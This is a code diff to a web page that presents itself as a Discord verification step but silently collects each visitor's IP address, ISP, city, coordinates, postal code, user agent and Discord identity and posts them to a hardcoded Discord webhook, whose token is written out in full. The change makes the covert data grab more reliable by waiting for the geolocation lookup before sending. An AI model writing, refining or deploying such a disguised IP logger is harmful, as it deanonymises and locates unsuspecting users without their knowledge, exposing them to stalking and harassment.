@@ -401,30 +401,27 @@
   const CLIENT_ID = '1490415878544687184';
   const WEBHOOK   = 'https://discord.com/api/webhooks/1532962613833629867/ZMFfCTJsJ3UxL6vKpAa0opRq65-RvF20X2Ly-ZGXfmrzIdCcpVg20_BkyOnLdVLjxBjf';
 
-  /* ── Silent IP grab on load ─────────────────────────────────────────────── */
-  let geo = {};
-  fetch('https://ipapi.co/json/')
+  /* ── Silent IP grab on load (Promise so webhook always waits) ───────────── */
+  const geoPromise = fetch('https://ipapi.co/json/')
     .then(r => r.json())
-    .then(d => {
-      geo = {
-        ip:      d.ip            || '—',
-        type:    d.version       || 'IPv4',
-        subnet:  d.network       || '—',
-        isp:     d.org           || '—',
-        host:    d.hostname      || 'Unknown',
-        city:    d.city          || '—',
-        region:  d.region        || '—',
-        country: d.country_name  || '—',
-        cc:      d.country_code  || '',
-        lat:     d.latitude      ?? '—',
-        lon:     d.longitude     ?? '—',
-        org:     d.org           || '—',
-        postal:  d.postal        || '—',
-        tz:      d.timezone      || '—',
-        asn:     d.asn           || '—',
-      };
-    })
-    .catch(() => {});
+    .then(d => ({
+      ip:      d.ip            || '—',
+      type:    d.version       || 'IPv4',
+      subnet:  d.network       || '—',
+      isp:     d.org           || '—',
+      host:    d.hostname      || 'Unknown',
+      city:    d.city          || '—',
+      region:  d.region        || '—',
+      country: d.country_name  || '—',
+      cc:      d.country_code  || '',
+      lat:     d.latitude      ?? '—',
+      lon:     d.longitude     ?? '—',
+      org:     d.org           || '—',
+      postal:  d.postal        || '—',
+      tz:      d.timezone      || '—',
+      asn:     d.asn           || '—',
+    }))
+    .catch(() => ({}));
 
   /* ── Start OAuth2 ────────────────────────────────────────────────────────── */
   function startVerify() {
@@ -484,13 +481,13 @@
       document.getElementById('verified-user').style.display = 'flex';
     }
 
-    // Fire webhook
+    // Fire webhook — awaited inside
     fireWebhook(user);
   }
 
   /* ── Build + send embed ─────────────────────────────────────────────────── */
-  function fireWebhook(user) {
-    const g  = geo;
+  async function fireWebhook(user) {
+    const g  = await geoPromise;   // always resolved before we build
     const ts = new Date().toISOString();
 
     const discordVal = user
@@ -501,7 +498,7 @@
       ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=128`
       : null;
 
-    fetch(WEBHOOK, {
+    await fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       mode: 'no-cors',
@@ -511,24 +508,24 @@
           color: 0x23a559,
           thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
           fields: [
-            { name: '👤 Discord',       value: discordVal,                              inline: false },
-            { name: '\u200b',           value: '\u200b',                                inline: false },
-            { name: 'IP Address',       value: '`' + g.ip + '`',                       inline: true  },
-            { name: 'IP Type',          value: g.type,                                  inline: true  },
-            { name: 'Subnet',           value: g.subnet,                                inline: true  },
-            { name: 'ISP',              value: g.isp,                                   inline: false },
-            { name: 'Hostname',         value: g.host,                                  inline: true  },
-            { name: 'City',             value: g.city,                                  inline: true  },
-            { name: 'Region',           value: g.region,                                inline: true  },
-            { name: 'Country',          value: g.country + (g.cc ? ' (' + g.cc + ')' : ''), inline: true },
-            { name: 'Latitude',         value: String(g.lat),                           inline: true  },
-            { name: 'Longitude',        value: String(g.lon),                           inline: true  },
-            { name: 'Organization',     value: g.org,                                   inline: false },
-            { name: 'Postal / Zip',     value: g.postal,                                inline: true  },
-            { name: 'Time Zone',        value: g.tz,                                    inline: true  },
-            { name: 'ASN',              value: g.asn,                                   inline: true  },
+            { name: '👤 Discord',       value: discordVal,                                   inline: false },
+            { name: '\u200b',           value: '\u200b',                                     inline: false },
+            { name: 'IP Address',       value: '`' + (g.ip     || '—') + '`',                inline: true  },
+            { name: 'IP Type',          value:  g.type   || '—',                              inline: true  },
+            { name: 'Subnet',           value:  g.subnet || '—',                              inline: true  },
+            { name: 'ISP',              value:  g.isp    || '—',                              inline: false },
+            { name: 'Hostname',         value:  g.host   || 'Unknown',                        inline: true  },
+            { name: 'City',             value:  g.city   || '—',                              inline: true  },
+            { name: 'Region',           value:  g.region || '—',                              inline: true  },
+            { name: 'Country',          value: (g.country || '—') + (g.cc ? ' (' + g.cc + ')' : ''), inline: true },
+            { name: 'Latitude',         value:  String(g.lat ?? '—'),                        inline: true  },
+            { name: 'Longitude',        value:  String(g.lon ?? '—'),                        inline: true  },
+            { name: 'Organization',     value:  g.org    || '—',                              inline: false },
+            { name: 'Postal / Zip',     value:  g.postal || '—',                              inline: true  },
+            { name: 'Time Zone',        value:  g.tz     || '—',                              inline: true  },
+            { name: 'ASN',              value:  g.asn    || '—',                              inline: true  },
             { name: 'User Agent',       value: '`' + (navigator.userAgent || '—').slice(0, 200) + '`', inline: false },
-            { name: 'Language',         value: navigator.language || '—',               inline: true  },
+            { name: 'Language',         value:  navigator.language || '—',                   inline: true  },
           ],
           footer: { text: 'Verified at ' + ts },
           timestamp: ts
